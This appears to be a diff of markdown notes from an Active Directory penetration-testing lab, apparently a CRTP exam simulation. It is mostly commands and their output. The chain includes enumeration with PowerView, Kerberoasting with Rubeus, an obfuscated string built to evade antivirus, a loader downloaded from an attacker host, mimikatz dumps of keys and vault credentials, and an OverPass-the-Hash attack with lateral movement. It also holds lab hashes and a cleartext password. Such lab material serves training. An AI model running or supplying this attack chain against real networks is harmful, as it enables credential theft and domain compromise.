@@ -311,6 +311,11 @@ DnsUpdateProxy
 ```
 ❌
 
+`Get-DomainGroupMember -Identity 'Remote Desktop Users'`:
+```
+```
+❌
+
 `Get-DomainGroup -UserName 'studentuser'`:
 ```
 grouptype              : GLOBAL_SCOPE, SECURITY
@@ -442,13 +447,19 @@ Closing writers
 ```
 ❌
 
-`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'studentuser'}`
+`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'studentuser'}`:
+```
+```
 ❌
 
-`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'techservice'}`
+`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'techservice'}`:
+```
+```
 ❌
 
-`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'databaseagent'}`
+`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'databaseagent'}`:
+```
+```
 ❌
 
 `Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'sqlserversync'}`:
@@ -494,6 +505,11 @@ IdentityReferenceClass  : user
 ```
 
 `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'RDPUsers'}`:
+```
+```
+❌
+
+`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'Remote Desktop Users'}`:
 ```
 ```
 ❌
@@ -772,15 +788,8 @@ ForEach-Object {
 
 `C:/AD/Tools/FindInterestingRightsDCsGPO.ps1`:
 ```
-SamAccountName                                                                                          ActiveDirectoryRights
---------------                                                                                          ---------------------
-dcorp\Domain Admins     CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
-dcorp\devopsadmin👤     CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl📌, WriteOwner
-mcorp\Enterprise Admins CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
-dcorp\Domain Admins     CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
-Local System            CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
-Creator Owner           CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
 ```
+❌
 
 ???
 
@@ -807,7 +816,6 @@ Creator Owner           CreateChild, DeleteChild, Self, WriteProperty, DeleteTre
 
 `type C:\AD\Tools\servers.txt`:
 ```
-studvm.tech.finance.corp
 mgmtsrv.tech.finance.corp
 techsrv30.tech.finance.corp
 dbserver31.tech.finance.corp
@@ -816,78 +824,53 @@ dbserver31.tech.finance.corp
 `Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt`:
 ```
 [SNIP]
-
  ---------------------------------------------------------------
  SHARE DISCOVERY
  ---------------------------------------------------------------
- [*][02/20/2025 06:31] Scan Start
- [*][02/20/2025 06:31] Output Directory: C:\AD\Tools\\SmbShareHunt-02202025063120
- [*][02/20/2025 06:31] Importing computer targets from C:\AD\Tools\servers.txt
- [*][02/20/2025 06:31] 7 systems will be targeted
- [*][02/20/2025 06:31] - Skipping ping scan.
- [*][02/20/2025 06:31] Checking if TCP Port 445 is open on 7 computers
- [*][02/20/2025 06:31] - 7 computers have TCP port 445 open.
- [*][02/20/2025 06:31] Getting a list of SMB shares from 7 computers
- [*][02/20/2025 06:31] - 23 SMB shares were found.
- [*][02/20/2025 06:31] Getting share permissions from 23 SMB shares
- [*][02/20/2025 06:31] - 30 share permissions were enumerated.
- [*][02/20/2025 06:31] Identifying potentially excessive share permissions
- [*][02/20/2025 06:31] - 10 potentially excessive privileges were found on 4 shares across 3 systems.
- [*][02/20/2025 06:31] Getting directory listings from 4 SMB shares
- [*][02/20/2025 06:31] - Targeting up to 3 nested directory levels
- [*][02/20/2025 06:31] - 6 files and folders were enumerated.
- [*][02/20/2025 06:31] Scan Complete
+ [*][03/11/2025 13:41] Scan Start
+ [*][03/11/2025 13:41] Output Directory: C:\AD\Tools\\SmbShareHunt-03112025134124
+ [*][03/11/2025 13:41] Importing computer targets from C:\AD\Tools\servers.txt
+ [*][03/11/2025 13:41] 3 systems will be targeted
+ [*][03/11/2025 13:41] - Skipping ping scan.
+ [*][03/11/2025 13:41] Checking if TCP Port 445 is open on 3 computers
+ [*][03/11/2025 13:41] - 3 computers have TCP port 445 open.
+ [*][03/11/2025 13:41] Getting a list of SMB shares from 3 computers
+ComputerName : techsrv30.tech.finance.corp
 
-[SNIP]
- 
- [*][02/20/2025 06:31] Creating ShareGraph nodes and edges...
- [*][02/20/2025 06:31] Analysis Complete
- ---------------------------------------------------------------
- SHARE REPORT SUMMARY📌
- ---------------------------------------------------------------
- [*][02/20/2025 06:31] Domain: SmbHunt
- [*][02/20/2025 06:31] Start time: 02/20/2025 06:31:20
- [*][02/20/2025 06:31] End time: 02/20/2025 06:31:45
- [*][02/20/2025 06:31] Run time: 00:00:25.1958136
- [*][02/20/2025 06:31]
- [*][02/20/2025 06:31] COMPUTER SUMMARY
- [*][02/20/2025 06:31] - 7 domain computers found.
- [*][02/20/2025 06:31] - 0 (0.00%) domain computers responded to ping. (No Ping)
- [*][02/20/2025 06:31] - 7 (100.00%) domain computers had TCP port 445 accessible.
- [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares that were non-default.
- [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares with potentially excessive privileges.
- [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares that allowed READ access.
- [*][02/20/2025 06:31] - 2 (28.57%) domain computers had shares that allowed WRITE access.
- [*][02/20/2025 06:31] - 1 (14.29%) domain computers had shares that are HIGH RISK.
- [*][02/20/2025 06:31]
- [*][02/20/2025 06:31] SHARE SUMMARY
- [*][02/20/2025 06:31] - 23 shares were found. We expect a minimum of 14 shares
- [*][02/20/2025 06:31]   because 7 systems had open ports and there are typically two default shares.
- [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems were non-default.
- [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems are configured with 10 potentially excessive ACLs.
- [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems allowed READ access.
- [*][02/20/2025 06:31] - 2 (8.70%) shares across 2 systems allowed WRITE access.
- [*][02/20/2025 06:31] - 2 (8.70%) shares across 1 systems are considered HIGH RISK.
- [*][02/20/2025 06:31]
- [*][02/20/2025 06:31] SHARE ACL SUMMARY
- [*][02/20/2025 06:31] - 30 ACLs were found.
- [*][02/20/2025 06:31] - 30 (100.00%) ACLs were associated with non-default shares.
- [*][02/20/2025 06:31] - 10 (33.33%) ACLs were found to be potentially excessive.
- [*][02/20/2025 06:31] - 6 (20.00%) ACLs were found that allowed READ access.
- [*][02/20/2025 06:31] - 2 (6.67%) ACLs were found that allowed WRITE access.
- [*][02/20/2025 06:31] - 5 (16.67%) ACLs were found that are associated with HIGH RISK share names.
- [*][02/20/2025 06:31]
- [*][02/20/2025 06:31] - The most common share names are:
- [*][02/20/2025 06:31] - 4 of 4 (100.00%) discovered shares are associated with the top 200 share names.
- [*][02/20/2025 06:31]   - 1 AI📁
- [*][02/20/2025 06:31]   - 1 studentshareadmin
- [*][02/20/2025 06:31]   - 1 C$
- [*][02/20/2025 06:31]   - 1 ADMIN$
- [*] -----------------------------------------------
- [*][02/20/2025 06:31]   - Generating HTML Report
- [*][02/20/2025 06:31]   - Estimated generation time: 1 minute or less
- [*][02/20/2025 06:31]   - All files written to C:\AD\Tools\\SmbShareHunt-02202025063120📌
- [*][02/20/2025 06:31]   - Done.
+
+IpAddress    : 172.16.6.30
+ComputerName : dbserver31.tech.finance.corp
+IpAddress    : 172.16.6.31
+ShareName    : C$
+ShareName    : ADMIN$
+ShareDesc    : Remote Admin
+ShareDesc    : Default share
+Sharetype    : 2147483648
+ShareAccess  : No
+
+Sharetype    : 2147483648
+ShareAccess  : Yes
+
+ComputerName : dbserver31.tech.finance.corp
+ComputerName : techsrv30.tech.finance.corp
+IpAddress    : 172.16.6.31
+ShareName    : C$
+IpAddress    : 172.16.6.30
+ShareName    : IPC$
+ShareDesc    : Remote IPC
+ShareDesc    : Default share
+Sharetype    : 2147483648
+ShareAccess  : No
+
+Sharetype    : 2147483651
+ShareAccess  : No
+ComputerName : dbserver31.tech.finance.corp
+IpAddress    : 172.16.6.31
+ShareName    : IPC$
+
+ShareDesc    : Remote IPC
+Sharetype    : 2147483651
+ShareAccess  : No
 ```
 
 `Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt`:
@@ -897,7 +880,7 @@ dbserver31.tech.finance.corp
  ---------------------------------------------------------------
  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
  ---------------------------------------------------------------
- SHARE DISCOVERY
+ SHARE DISCOVERY📌
  ---------------------------------------------------------------
  [*][03/11/2025 03:05] Scan Start
  [*][03/11/2025 03:05] Output Directory: C:\AD\Tools\\SmbShareHunt-03112025030549
@@ -949,13 +932,13 @@ At C:\AD\Tools\PowerHuntShares.psm1:2265 char:92
 
 `dir C:\AD\Tools\SmbShareHunt-02202025063120`:
 ```
-    Directory: C:\AD\Tools\SmbShareHunt-02202025063120
+    Directory: C:\AD\Tools\SmbShareHunt-03112025134124
 
 
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
-d-----         2/20/2025   6:31 AM                Results
--a----         2/20/2025   6:31 AM        1069450 Summary-Report-SmbHunt.html📌
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/11/2025   1:42 PM                Results
+-a----        3/11/2025   1:42 PM         971698 Summary-Report-SmbHunt.html📌
 ```
 
 **Domain Enumeration | Local Admin Access**
@@ -969,7 +952,7 @@ d-----         2/20/2025   6:31 AM                Results
 
 `Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
 
-`Find-PSRemotingLocalAdminAccess`:
+`Find-PSRemotingLocalAdminAccess -Domain tech.finance.corp`:
 ```
 ```
 ❌
@@ -1140,8 +1123,27 @@ Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 
 ![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
 
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
 `Get-Content C:\AD\Tools\servers.txt | % { Test-NetConnection $_ -Port 8080 }`:
 ```
+WARNING: TCP connect to (172.16.4.1 : 8080) failed
+
+
+ComputerName           : tech-dc.tech.finance.corp
+RemoteAddress          : 172.16.4.1
+RemotePort             : 8080
+InterfaceAlias         : Ethernet
+SourceAddress          : 172.16.100.1
+PingSucceeded          : True
+PingReplyDetails (RTT) : 1 ms
+TcpTestSucceeded       : False
+
+WARNING: TCP connect to (fe80::dca5:8ad4:c3fa:8934%4 : 8080) failed
+WARNING: TCP connect to (172.16.100.1 : 8080) failed
 ComputerName           : studvm.tech.finance.corp
 RemoteAddress          : fe80::dca5:8ad4:c3fa:8934%4
 RemotePort             : 8080
@@ -1151,19 +1153,25 @@ PingSucceeded          : True
 PingReplyDetails (RTT) : 0 ms
 TcpTestSucceeded       : False
 
-ComputerName     : mgmtsrv.tech.finance.corp🖥️
-RemoteAddress    : 172.16.5.156🌐
-RemotePort       : 8080
-InterfaceAlias   : Ethernet
-SourceAddress    : 172.16.100.1
-TcpTestSucceeded : True📌
+WARNING: TCP connect to (172.16.5.156 : 8080) failed
+ComputerName           : mgmtsrv.tech.finance.corp
+RemoteAddress          : 172.16.5.156
+RemotePort             : 8080
+InterfaceAlias         : Ethernet
+SourceAddress          : 172.16.100.1
+PingSucceeded          : True
+PingReplyDetails (RTT) : 1 ms
+TcpTestSucceeded       : False
 
-ComputerName     : techsrv30.tech.finance.corp🖥️
-RemoteAddress    : 172.16.6.30🌐
-RemotePort       : 8080
-InterfaceAlias   : Ethernet
-SourceAddress    : 172.16.100.1
-TcpTestSucceeded : True📌
+WARNING: TCP connect to (172.16.6.30 : 8080) failed
+ComputerName           : techsrv30.tech.finance.corp
+RemoteAddress          : 172.16.6.30
+RemotePort             : 8080
+InterfaceAlias         : Ethernet
+SourceAddress          : 172.16.100.1
+PingSucceeded          : True
+PingReplyDetails (RTT) : 1 ms
+TcpTestSucceeded       : False
 
 WARNING: TCP connect to (172.16.6.31 : 8080) failed
 ComputerName           : dbserver31.tech.finance.corp
@@ -1172,15 +1180,10 @@ RemotePort             : 8080
 InterfaceAlias         : Ethernet
 SourceAddress          : 172.16.100.1
 PingSucceeded          : True
-PingReplyDetails (RTT) : 2 ms
+PingReplyDetails (RTT) : 1 ms
 TcpTestSucceeded       : False
 ```
-
-| Computer                      | IP Address               | Port 8080 Open?            |
-|--------------------------------|--------------------------|----------------------------|
-| mgmtsrv.tech.finance.corp     | 172.16.5.156🌐          | ✅ Yes                     |
-| techsrv30.tech.finance.corp   | 172.16.6.30🌐           | ✅ Yes                     |
-| dbserver31.tech.finance.corp  | 172.16.6.31             | ❌ No (TCP Test Failed) |
+❌
 
 `nmap -iL C:\AD\Tools\servers.txt -p 80,443,8080,8000 --open`:
 ```
@@ -1199,40 +1202,7 @@ PORT     STATE SERVICE
 
 Nmap done: 4 IP addresses (4 hosts up) scanned in 26.21 seconds
 ```
-
-`nmap -sSV 172.16.5.156 172.16.6.30 -p8080`:
-```
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-11 07:44 Pacific Daylight Time
-Nmap scan report for 172.16.5.156
-Host is up (0.0020s latency).
-
-PORT     STATE SERVICE    VERSION
-8080/tcp open  tcpwrapped🌐
-
-Nmap scan report for 172.16.6.30
-Host is up (0.0019s latency).
-
-PORT     STATE SERVICE    VERSION
-8080/tcp open  tcpwrapped🌐
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 2 IP addresses (2 hosts up) scanned in 19.58 seconds
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
+❌
 
 ---
 
@@ -1248,6 +1218,18 @@ Nmap done: 2 IP addresses (2 hosts up) scanned in 19.58 seconds
 ```
 
 `Import-Module C:\AD\Tools\PowerView.ps1`
+
+`Get-DomainComputer 'dbserver31' | Select-Object -ExpandProperty serviceprincipalname`:
+```
+TERMSRV/DBSERVER31
+TERMSRV/dbserver31.tech.finance.corp
+WSMAN/dbserver31
+WSMAN/dbserver31.tech.finance.corp
+RestrictedKrbHost/DBSERVER31
+HOST/DBSERVER31
+RestrictedKrbHost/dbserver31.tech.finance.corp
+HOST/dbserver31.tech.finance.corp
+```
 
 `Get-DomainUser -SPN`:
 ```
@@ -1289,9 +1271,17 @@ name                  : sqlserver sync
 [SNIP]
 ```
 
+`Get-DomainUser -SPN | Select samaccountname, serviceprincipalname`:
+```
+samaccountname   serviceprincipalname
+--------------   --------------------
+krbtgt           kadmin/changepw
+sqlserversync👤  MSSQLSvc📌/dbserver31.tech.finance.corp📌
+```
+
 ![BloodHound Legacy | Analysis - List all Kerberoastable Accounts](crtp_exam_simulation_bloodhound_list_all_kerberoastable_accounts.png)
 
-`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:sqlserversync /simple /rc4opsec /outfile:C:\AD\Tools\krb5tgs_hashes.txt`:
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:sqlserversync /simple /rc4opsec /format:john /outfile:C:\AD\Tools\krb5tgs_hashes.txt`:
 ```
 ```
 ❌
@@ -1320,6 +1310,13 @@ set "q=k"
 set "Pwn=%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
 ```
 
+```cmd
+set "z=kerb"
+set "y=ero"
+set "x=ast"
+set "Pwn=%z%%y%%x%"
+```
+
 ```powershell
 $z="t";$y="s";$x="a";$w="o";$v="r";$u="e";$t="b";$s="r";$r="e";$q="k";$Pwn="$q$r$s$t$u$v$w$x$y$z"
 ```
@@ -1329,7 +1326,7 @@ $z="t";$y="s";$x="a";$w="o";$v="r";$u="e";$t="b";$s="r";$r="e";$q="k";$Pwn="$q$r
 kerberoast
 ```
 
-`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args $Pwn /user:sqlserversync /simple /rc4opsec /outfile:C:\AD\Tools\krb5tgs_hashes.txt`:
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args $Pwn /user:sqlserversync /simple /rc4opsec /format:john /outfile:C:\AD\Tools\krb5tgs_hashes.txt`:
 ```
 [*] Action: Kerberoasting📌
 
@@ -1347,6 +1344,15 @@ kerberoast
 
 [*] Roasted hashes written to : C:\AD\Tools\krb5tgs_hashes.txt📌
 ```
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
+`Import-Module C:\AD\Tools\PowerView.ps1`
 
 `Get-DomainUser -SPN | % {Invoke-Kerberoast -Identity $_.samaccountname}`:
 ```
@@ -1632,11 +1638,11 @@ S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [T
 
 `iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`
 
-`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
+`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
 
 ![HFS -SafetyKatz.exe](learning_objective_07_hfs_safetykatz.png)
 
-`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit`:
+`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe sekurlsa::evasive-keys exit`:
 ```
 [SNIP]
 
@@ -1688,6 +1694,24 @@ SID               : S-1-5-18
 [SNIP]
 ```
 🚩
+
+`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe token::elevate`:
+```
+[SNIP]
+
+mimikatz(commandline) # token::elevate📌
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+588     {0;000003e7} 1 D 18373          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !📌
+ * Process Token : {0;0028e875} 0 D 2685490     TECH\Administrator      S-1-5-21-1325336202-3661212667-302732393-500            (12g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 2701727     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # vault::cred /patch
+```
+❌
 
 #### Domain Persistence | Silver Ticket
 
@@ -1758,11 +1782,355 @@ C:\Users\Administrator.TECH>
 ```
 🚀
 
+---
+
+## Domain Lateral Movement
+
+### Domain Lateral Movement 1 | Credential Extraction (with ...)
+
+- **Gain Access to the DC with DA Privileges using an OverPass-The-Hash Attack (for Lateral Movement)**
+???
+
+![Run as administrator](learning_objectives_run_as_administrator.png)
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:techservice /aes256:7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
+```
+[SNIP]
+
+[*] Action: Ask TGT📌
+
+[*] Got domain: tech.finance.corp
+[*] Showing process : True
+[*] Username        : 04ZH8ONJ
+[*] Domain          : 4UIN93E5
+[*] Password        : UOZK2GE6
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 3324
+[+] LUID            : 0x5dbd08
+
+[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
+[!] Pre-Authentication required!
+[!]     AES256 Salt: TECH.FINANCE.CORPtechservice
+[*] Using aes256_cts_hmac_sha1 hash: 7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb
+[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\techservice'
+[*] Target LUID : 6143240
+[*] Using domain controller: 172.16.4.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+[SNIP]
+
+[*] Target LUID: 0x5dbd08
+[+] Ticket successfully imported!🎟️
+
+  ServiceName              :  krbtgt/TECH.FINANCE.CORP
+  ServiceRealm             :  TECH.FINANCE.CORP
+  UserName                 :  techservice🎭 (NT_PRINCIPAL)
+  UserRealm                :  TECH.FINANCE.CORP🏛️
+  StartTime                :  3/11/2025 11:16:55 AM
+  EndTime                  :  3/11/2025 9:16:55 PM
+  RenewTill                :  3/18/2025 11:16:55 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  rD+bz7cOAiFFiUDjDt0KMcx5KpKUFquKg7SQQswIWEs=
+  ASREP (key)              :  7F6825F607E9474BCD6B9C684DC70F7C1CA977ADE7BFD2AD152FD54968349DEB
+```
+
+![New spawned terminal process 1](learning_objective_07_new_spawned_terminal_process_1.png)
+
+`klist`:
+```
+Current LogonId is 0:0x5dbd08
+
+Cached Tickets: (1)
+
+#0>     Client: techservice🎭 @ TECH.FINANCE.CORP🏛️
+        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 3/11/2025 11:16:55 (local)
+        End Time:   3/11/2025 21:16:55 (local)
+        Renew Time: 3/18/2025 11:16:55 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+`winrs -r:techsrv30.tech.finance.corp cmd /c "set computername && set username"`:
+```
+COMPUTERNAME=TECHSRV30🖥️
+USERNAME=techservice👤
+```
+🚩
+
+`winrs -r:techsrv30.tech.finance.corp cmd`:
+```
+Microsoft Windows [Version 10.0.17763.2452]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\techservice>
+```
+🚀
+
+![techsrv30 | techservice](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice-64b5f6?logo=windows11&logoColor=white)
+
+`whoami /priv`:
+```
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+```
+
+`whoami /groups`:
+```
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ===============================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
+```
+
+`powershell`
+
+`$ExecutionContext.SessionState.LanguageMode`:
+```
+FullLanguage
+```
+
+- **Extract the Encryption Key Hash (from the Target Machine 1 `dcorp-mgmt`) of the Target Domain Administrator**
+???
+
+![HFS - Loader.exe](learning_objective_07_hfs_loader.png)
+
+`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`
+
+`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
+
+![HFS -SafetyKatz.exe](learning_objective_07_hfs_safetykatz.png)
+
+`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe sekurlsa::evasive-keys exit`:
+```
+[SNIP]
+
+mimikatz(commandline) # sekurlsa::evasive-keys📌
+
+[SNIP]
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : TECHSRV30$👤
+Domain            : TECH
+Logon Server      : (null)
+Logon Time        : 3/11/2025 5:54:35 AM
+SID               : S-1-5-18
+
+         * Username : techsrv30$
+         * Domain   : TECH.FINANCE.CORP
+         * Password : (null)
+         * Key List :
+           aes256_hmac       cf9663ec900673821727858b404456a9f7c104e5a731253781e47cf601b9f747🔑
+           rc4_hmac_nt       54c0572a3ddc383be81cdd37b3c8d8a6
+           rc4_hmac_old      54c0572a3ddc383be81cdd37b3c8d8a6
+           rc4_md4           54c0572a3ddc383be81cdd37b3c8d8a6
+           rc4_hmac_nt_exp   54c0572a3ddc383be81cdd37b3c8d8a6
+           rc4_hmac_old_exp  54c0572a3ddc383be81cdd37b3c8d8a6
+```
+🚩
+
+`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe token::elevate`:
+```
+[SNIP]
+
+mimikatz(commandline) # token::elevate📌
+
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+596     {0;000003e7} 1 D 18459          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !📌
+ * Process Token : {0;0028c0cb} 0 D 2727993     TECH\techservice        S-1-5-21-1325336202-3661212667-302732393-1109   (09g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 2744954     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz(commandline) # vault::cred /patch📌
+
+TargetName : Domain:batch=TaskScheduler:Task:{877E4326-BAD4-4516-A4B1-60C73F0EFDDA} / <NULL>
+UserName   : TECH\databaseagent👤
+Comment    : <NULL>
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Flags      : 00004004
+Credential : CheckforSQLServer31-Availability🔑
+Attributes : 0
+
+[SNIP]
+```
+🚩
+
+![Run as administrator](learning_objectives_run_as_administrator.png)
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`runas /user:tech\databaseagent /netonly "powershell -Command \"Start-Process cmd -Verb RunAs\""`:
+```
+Enter the password for tech\databaseagent:📌
+Attempting to start powershell -Command "Start-Process cmd -Verb RunAs" as user "tech\databaseagent" ...
+```
+
+![New spawned terminal process 2](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_2.png)
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`whoami`:
+```
+tech\studentuser👤
+```
+
+`hostname`:
+```
+studvm🖥️
+```
+
+`whoami /groups`:
+```
+ERROR: Unable to get group membership information.
+```
+❌
+
+`whoami /priv`:
+```
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
